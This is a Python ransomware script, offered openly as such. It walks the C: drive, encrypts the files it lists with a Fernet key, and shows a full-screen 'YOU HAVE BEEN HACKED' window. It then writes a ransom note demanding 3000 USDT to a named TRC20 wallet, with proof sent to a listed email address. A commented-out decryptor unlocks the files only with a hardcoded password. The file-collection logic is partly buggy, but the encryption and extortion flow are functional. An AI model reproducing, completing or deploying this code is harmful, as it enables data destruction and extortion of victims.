import os
from cryptography.fernet import Fernet
from tkinter import *
from tkinter import ttk





file_paths = []
for root, dirs, files in os.walk("C:\\"):
    for file in files:
        if file == "ransomware_encrypt.py" or file == "thekey.key" or file == "ransomware_decrypt.py":
            continue
        if os.path.isfile(file):
            file_paths.append(root+'\\'+file)


key = Fernet.generate_key()
with open("thekey.key", "wb") as thekey:
    thekey.write(key)

for file in file_paths:
    try:
        with open(file, 'rb') as thefile:
            contents = thefile.read()
        contents_encrypted = Fernet(key).encrypt(contents)
        with open(file, 'wb') as thefile:
            thefile.write(contents_encrypted)
    except Exception as e:
        continue

root = Tk()
root.title("YOU'VE BEEN HACKED")
root.geometry("1200x1000")
text = ttk.Label(root, text="YOU HAVE BEEN HACKED!!! Open the file called\ INSTRUCTIONS.TXT\n\
before doing ANYTHING ELSE ensure that you can restore your files.\n\
WARNING!!!!!!! DO NOT TRY try to run this program again \n\
or your files may become UNRECOVERABLE", foreground='red', font=('Arial', 28))
text.pack()
root.mainloop()

with open("INSTRUCTIONS.TXT", 'w') as hacked:
    hacked.write("""To send 3000 USDT cryptocurrency to this address:

TNVVbqN4C5DKAK5BdFxvsxbDQjaEHQw3gJ

on the TRC20 network.

I will send you the decryption password key after you send a screenshot to this email : danix1991@proton.me
WARNING!!! I highly recommend not trying to guess the decryption password... It's impossible :)""")







# import os
# from cryptography.fernet import Fernet



# decryption_password = "+j@RaEUyF4?dYMq4_g_=2jChgWW%658-^en@FazTMDwDJwfef9&EgF%e8qkR3&tgj-X^WCM!C^LqNRkq-u^tLuQzFrR4ua=C-ytZqJAy3-B5TkF4FgQPpA%kWLLbKMF*%6xYCn-H8Rr_wtw=jJvb9fH#UWRLYpnW*aGHVQZn^JRJ#@@hVXt+!*RXANw2LhD3-tbcdj-LZXL!&K$h!kMzUWpvrQ-C@&z*!j6pg-2%g54?$X5DWnA#YZU-tVcJ&+^d"

# file_paths = []
# for root, dirs, files in os.walk("C:\\"):
#     for file in files:
#         if file == "ransomware_encrypt.py" or file == "thekey.key" or file == "ransomware_decrypt.py":
#             continue
#         if os.path.isfile(file):
#             path, ext = os.path.splitext(root+'\\'+file)
#             file_paths.append(root+'\\'+file)


# with open("thekey.key", "rb") as key:
#     secretkey = key.read()

# password_attempt = input("Enter password to restore your files:\n")
    
# if password_attempt == decryption_password:
    
#     for file in file_paths:
#         try:
#             with open(file, 'rb') as thefile:
#                 contents = thefile.read()
#                 contents_decrypted = Fernet(secretkey).decrypt(contents)
#             with open(file, 'wb') as thefile:
#                 thefile.write(contents_decrypted)
#         except Exception:
#             continue

# else:
    
#     print("You Have Exceeded Your Password Attempts.")

